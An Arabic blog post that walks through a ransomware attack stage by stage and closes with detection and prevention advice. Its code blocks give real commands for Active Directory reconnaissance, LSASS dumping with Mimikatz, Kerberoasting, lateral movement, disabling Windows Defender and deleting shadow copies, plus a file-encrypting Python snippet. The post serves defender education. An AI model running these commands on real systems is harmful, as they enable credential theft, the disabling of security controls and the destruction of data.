---
layout: blog
title: "تشريح هجوم Ransomware الكامل: من الاختراق الأولي حتى التشفير النهائي"
date: 2026-04-02T07:14:53Z
category: "تحليل"
excerpt: "هجمات Ransomware لم تعد مجرد برمجيات خبيثة عشوائية. أصبحت عمليات منظمة تتبع منهجيات دقيقة، من الاستطلاع حتى المساومة. نشرّح هنا دورة حياة هجوم حقيقي، نحلل كل مرحلة تقنيًا، ونفهم كيف يفكر المهاجم ليتمكن المدافع من الاستعداد بشكل صحيح."
read_time: 8
tags: ["Ransomware", "Threat Analysis", "Incident Response", "Red Team", "Active Directory Security"]
slug: "ransomware-anatomy"
image: "/OffsecAR/assets/images/blogs/ransomware-anatomy.svg"
---

## المرحلة الأولى: Initial Access والاستطلاع

تبدأ معظم هجمات Ransomware الاحترافية بـ Initial Access عبر ثلاث نقاط رئيسية: Phishing emails، استغلال خدمات RDP المكشوفة، أو ثغرات في الأنظمة العامة.

المهاجمون يشترون غالبًا Initial Access من Access Brokers في الـ Dark Web. هؤلاء الوسطاء متخصصون في اختراق الشبكات وبيع الوصول لعصابات Ransomware.

بعد الوصول الأولي، يبدأ الاستطلاع الداخلي:

```powershell
# Network enumeration
net view /domain
net group "Domain Admins" /domain
nltest /domain_trusts

# Active Directory reconnaissance
Import-Module ActiveDirectory
Get-ADUser -Filter * -Properties *
Get-ADComputer -Filter * | Select-Object Name,OperatingSystem

# Network shares discovery
net view \\dc01 /all
Get-SmbShare
```

هذه المرحلة قد تستمر أيامًا أو أسابيع. المهاجم يدرس البيئة، يحدد الأصول الحرجة، ويخطط للمراحل التالية بصمت تام.

## المرحلة الثانية: Credential Harvesting وتصعيد الصلاحيات

بدون صلاحيات Domain Admin، لن ينجح الهجوم. المهاجمون يستخدمون أدوات مثل Mimikatz وLSASS dumping:

```powershell
# LSASS memory dump using ProcDump
procdump.exe -accepteula -ma lsass.exe lsass.dmp

# Mimikatz offline parsing
mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords" exit

# Kerberoasting attack
Import-Module .\Invoke-Kerberoast.ps1
Invoke-Kerberoast -OutputFormat Hashcat | fl

# AS-REP Roasting
Get-DomainUser -PreauthNotRequired | select samaccountname
```

المهاجمون المحترفون يستخدمون Living off the Land (LotL) techniques، يعتمدون على أدوات نظام التشغيل الأصلية لتجنب اكتشاف الـ EDR.

بعد الحصول على Domain Admin، يثبّت المهاجم Backdoors متعددة لضمان Persistence، حتى لو تم اكتشاف نقطة الدخول الأصلية.

## المرحلة الثالثة: Lateral Movement ونشر البنية التحتية

الآن يبدأ الانتشار الجانبي عبر الشبكة:

```bash
# PSExec lateral movement
psexec.exe \\TARGET-PC -u DOMAIN\Admin -p Pass123 cmd.exe

# WMI-based lateral movement
wmic /node:TARGET-PC /user:DOMAIN\Admin process call create "cmd.exe /c payload.exe"

# PowerShell remoting
Enter-PSSession -ComputerName TARGET-PC -Credential DOMAIN\Admin
Invoke-Command -ComputerName (Get-Content servers.txt) -ScriptBlock {payload}
```

خلال هذه المرحلة، يحدث أمران حاسمان:

**أولًا: Data Exfiltration** - المهاجمون ينسخون البيانات الحساسة قبل التشفير للابتزاز المزدوج (Double Extortion). يستخدمون أدوات مثل Rclone أو Mega.nz لرفع تيرابايتات من البيانات.

**ثانيًا: Disabling Security** - تعطيل جميع حلول الحماية:

```powershell
# Disable Windows Defender
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -DisableIOAVProtection $true

# Stop security services
Stop-Service -Name WinDefend -Force
Get-Service | Where-Object {$_.DisplayName -like "*Symantec*"} | Stop-Service -Force

# Delete shadow copies
vssadmin delete shadows /all /quiet
wmic shadowcopy delete
```

## المرحلة الرابعة: Ransomware Deployment والتشفير

اللحظة النهائية تحدث غالبًا خارج ساعات العمل، نهاية الأسبوع عادةً:

```python
# Simplified ransomware encryption logic
import os
from cryptography.fernet import Fernet

def encrypt_file(file_path, key):
    f = Fernet(key)
    with open(file_path, 'rb') as file:
        file_data = file.read()
    encrypted_data = f.encrypt(file_data)
    with open(file_path + '.locked', 'wb') as file:
        file.write(encrypted_data)
    os.remove(file_path)

# Network-wide deployment via GPO or PSExec
# Targets: Domain Controllers, File Servers, Backups, Databases
```

الـ Ransomware الحديث يستخدم:
- **Multi-threading** لتشفير سريع
- **Intermittent encryption** (تشفير جزئي للملفات الكبيرة لتسريع العملية)
- **Network share enumeration** لتشفير كل ما هو متاح

التشفير يستهدف امتدادات محددة: `.docx, .xlsx, .pdf, .sql, .vmdk, .vhdx`، ويتجنب ملفات النظام لإبقاء الجهاز قابلاً للتشغيل.

## الدفاع: كيف نكسر سلسلة الهجوم

فهم المراحل يساعدنا في بناء دفاع متعدد الطبقات:

**Detection في كل مرحلة:**
- مراقبة anomalous logons وساعات غير اعتيادية
- تنبيهات على LSASS access أو Mimikatz indicators
- رصد lateral movement عبر Event IDs: 4624, 4672, 4688
- كشف mass file modifications في وقت قصير

**Prevention الأساسية:**
- Network segmentation لعزل الأصول الحرجة
- MFA على جميع نقاط الوصول
- Application whitelisting (AppLocker/WDAC)
- Offline, immutable backups (قاعدة 3-2-1)

**Response Plan:**
خطة IR واضحة مع runbooks جاهزة. كل دقيقة مهمة عند اكتشاف indicators أولية.

الهجوم يستغرق أسابيع للتحضير، لكن التشفير يحدث في دقائق. فهم هذا التوقيت حاسم للاستجابة الفعالة.
